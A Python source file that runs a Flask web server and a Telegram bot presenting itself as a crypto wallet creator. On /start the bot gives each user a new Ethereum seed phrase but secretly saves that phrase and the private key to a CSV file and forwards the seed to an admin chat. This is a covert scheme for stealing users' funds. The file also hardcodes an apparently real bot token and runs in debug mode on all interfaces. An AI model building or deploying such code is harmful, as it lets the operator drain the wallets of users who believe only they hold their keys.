from flask import Flask, send_from_directory
import telebot
import os
import csv
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

# === Flask часть ===
app = Flask(__name__, static_folder="miniapp")

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

# === Telegram-бот часть ===
TOKEN = "7987309610:AAHJkAlbPTxhToO9iyNvnh6I43kacWSP81M"  # Заменить при необходимости
bot = telebot.TeleBot(TOKEN)

USERS_FILE = "users.csv"
ADMIN_CHAT_ID = "ВАШ_TG_ID_ИЛИ_ЧАТ"

REAL_COIN = "ETH"
COIN_ENUM = Bip44Coins.ETHEREUM

def ensure_users_file():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["telegram_id", "account_id", "seed_phrase", "private_key", "public_address", "coin"])

def generate_wallet():
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_mst = Bip44.FromSeed(seed_bytes, COIN_ENUM)
    acct = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    return {
        "mnemonic": str(mnemonic),
        "private_key": acct.PrivateKey().Raw().ToHex(),
        "public_address": acct.PublicKey().ToAddress()
    }

def save_user(telegram_id, account_id, wallet):
    with open(USERS_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([telegram_id, account_id, wallet["mnemonic"], wallet["private_key"], wallet["public_address"], REAL_COIN])

@bot.message_handler(commands=["start"])
def handle_start(msg):
    telegram_id = msg.from_user.id
    ensure_users_file()

    account_id = f"id{telegram_id}"  # Можно сделать автоинкрементом, если нужно
    wallet = generate_wallet()
    save_user(telegram_id, account_id, wallet)

    bot.send_message(telegram_id, f"✅ Ваш криптокошелёк создан\n\n💼 Адрес: `{wallet['public_address']}`\n\n🔐 Seed фраза:\n`{wallet['mnemonic']}`\n\n⚠️ Обязательно сохраните фразу. Она даёт полный доступ к средствам.")
    # Уведомление админу
    bot.send_message(ADMIN_CHAT_ID, f"👤 Новый пользователь\nTelegram ID: `{telegram_id}`\nAccount: `{account_id}`\n\n📥 Адрес: `{wallet['public_address']}`\n🧠 Seed: `{wallet['mnemonic']}`")

# Flask запускает бота
import threading
def start_telegram_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=start_telegram_bot).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(debug=True, host="0.0.0.0", port=port)
